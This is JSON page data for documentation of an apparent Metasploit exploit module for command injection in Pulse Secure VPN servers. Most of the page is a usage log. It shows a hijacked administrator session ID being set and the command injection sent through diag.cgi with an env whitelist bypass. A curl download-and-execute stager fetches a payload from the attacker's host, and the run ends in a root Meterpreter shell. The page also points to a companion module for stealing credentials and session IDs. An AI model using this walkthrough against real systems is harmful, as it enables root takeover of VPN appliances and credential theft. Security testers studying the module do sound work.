{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/http/pulse_secure_cmd_exec","result":{"data":{"moduleMetadataJson":{"id":"382e0369-dfaf-5ae6-ba9d-2ba476d04a90","name":"Pulse Secure VPN Arbitrary Command Execution","fullname":"exploit/linux/http/pulse_secure_cmd_exec","description":"This module exploits a post-auth command injection in the Pulse Secure\n        VPN server to execute commands as root. The env(1) command is used to\n        bypass application whitelisting and run arbitrary commands.\n\n        Please see related module auxiliary/gather/pulse_secure_file_disclosure\n        for a pre-auth file read that is able to obtain plaintext and hashed\n        credentials, plus session IDs that may be used with this exploit.\n\n        A valid administrator session ID is required in lieu of untested SSRF.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/linux/http/pulse_secure_cmd_exec","documentationSlug":"/modules/documentation/exploit/linux/http/pulse_secure_cmd_exec"},"documentation":{"html":"<h2 id=\"introduction\" style=\"position:relative;\"><a href=\"#introduction\" aria-label=\"introduction permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Introduction</h2>\n<p>This module exploits a post-auth command injection in the Pulse Secure\nVPN server to execute commands as root. The <code class=\"language-text\">env(1)</code> command is used to\nbypass application whitelisting and run arbitrary commands.</p>\n<p>Please see related module <code class=\"language-text\">auxiliary/gather/pulse_secure_file_disclosure</code>\nfor a pre-auth file read that is able to obtain plaintext and hashed\ncredentials, plus session IDs that may be used with this exploit.</p>\n<p>A valid administrator session ID is required in lieu of untested SSRF.</p>\n<h2 id=\"targets\" style=\"position:relative;\"><a href=\"#targets\" aria-label=\"targets permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Targets</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">Id  Name\n--  ----\n0   Unix In-Memory\n1   Linux Dropper</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p><strong>SID</strong></p>\n<p>Set this to a valid administrator session ID. Typically retrieved using\nthe <code class=\"language-text\">auxiliary/gather/pulse_secure_file_disclosure</code> module.</p>\n<h2 id=\"usage\" style=\"position:relative;\"><a href=\"#usage\" aria-label=\"usage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Usage</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(linux/http/pulse_secure_cmd_exec) &gt; set sid 676f5f892e8c4a6419f10564f9e9d857\nsid =&gt; 676f5f892e8c4a6419f10564f9e9d857\nmsf5 exploit(linux/http/pulse_secure_cmd_exec) &gt; run\n\n[*] Started reverse TCP handler on 127.0.0.1:[redacted]\n[+] Setting session cookie: DSID=676f5f892e8c4a6419f10564f9e9d857\n[*] Obtaining CSRF token\n[+] CSRF token: 6b0e020e1de8c68c043ea0e4f663b7a5\n[*] Executing Linux Dropper target\n[*] Using URL: https://0.0.0.0:[redacted]/HSEjp77\n[*] Local IP: https://[redacted]:[redacted]/HSEjp77\n[*] Generated command stager: [&quot;curl -kso /tmp/qlUqDxCU https://[redacted]:[redacted]/HSEjp77&quot;, &quot;chmod +x /tmp/qlUqDxCU&quot;, &quot;/tmp/qlUqDxCU&quot;, &quot;rm -f /tmp/qlUqDxCU&quot;]\n[*] Executing command: env /home/bin/curl -kso /tmp/qlUqDxCU https://[redacted]:[redacted]/HSEjp77\n[*] Yeeting exploit at https://[redacted]/dana-admin/diag/diag.cgi\n[*] Triggering payload at https://[redacted]/dana-na/auth/setcookie.cgi\n[*] Client 127.0.0.1 (curl/7.19.7 (i686-redhat-linux-gnu) libcurl/7.19.7 OpenSSL/1.0.1h zlib/1.2.3 libidn/1.18) requested /HSEjp77\n[*] Sending payload to 127.0.0.1 (curl/7.19.7 (i686-redhat-linux-gnu) libcurl/7.19.7 OpenSSL/1.0.1h zlib/1.2.3 libidn/1.18)\n[+] Payload execution successful\n[*] Command Stager progress -  63.96% done (71/111 bytes)\n[*] Executing command: env chmod +x /tmp/qlUqDxCU\n[*] Yeeting exploit at https://[redacted]/dana-admin/diag/diag.cgi\n[*] Triggering payload at https://[redacted]/dana-na/auth/setcookie.cgi\n[+] Payload execution successful\n[*] Command Stager progress -  87.39% done (97/111 bytes)\n[*] Executing command: env /tmp/qlUqDxCU\n[*] Yeeting exploit at https://[redacted]/dana-admin/diag/diag.cgi\n[*] Triggering payload at https://[redacted]/dana-na/auth/setcookie.cgi\n[*] Meterpreter session 1 opened (127.0.0.1:[redacted] -&gt; 127.0.0.1:53200) at 2019-11-12 02:05:40 -0600\n[!] Payload execution may have failed\n[*] Command Stager progress - 102.70% done (114/111 bytes)\n[*] Executing command: env rm -f /tmp/qlUqDxCU\n[*] Yeeting exploit at https://[redacted]/dana-admin/diag/diag.cgi\n[*] Triggering payload at https://[redacted]/dana-na/auth/setcookie.cgi\n[+] Payload execution successful\n[*] Command Stager progress - 123.42% done (137/111 bytes)\n[*] Server stopped.\n\nmeterpreter &gt; getuid\nServer username: uid=0, gid=0, euid=0, egid=0\nmeterpreter &gt; sysinfo\nComputer     : [redacted]\nOS           :  (Linux 2.6.32-00486-gddd7e32-dirty)\nArchitecture : x64\nBuildTuple   : x86_64-linux-musl\nMeterpreter  : x64/linux\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"382e0369-dfaf-5ae6-ba9d-2ba476d04a90"}}}